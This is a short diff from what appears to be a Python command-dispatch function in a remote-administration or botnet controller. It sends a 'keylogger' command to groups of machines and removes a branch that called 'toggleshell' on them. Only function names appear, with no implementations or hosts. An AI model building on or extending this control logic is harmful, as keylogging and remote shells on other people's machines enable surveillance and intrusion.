@@ -43,9 +43,6 @@ def groupcommands( command_id, group_id, *argv ):
 			elif int(command_id) == 4:
 				for machine in result:
 					keylogger(machine[0], argv[0])
-			elif int(command_id) == 5:
-				for machine in result:
-					toggleshell(machine[0], argv[0], argv[1])
 
 	except Error as error:
 		print(error)
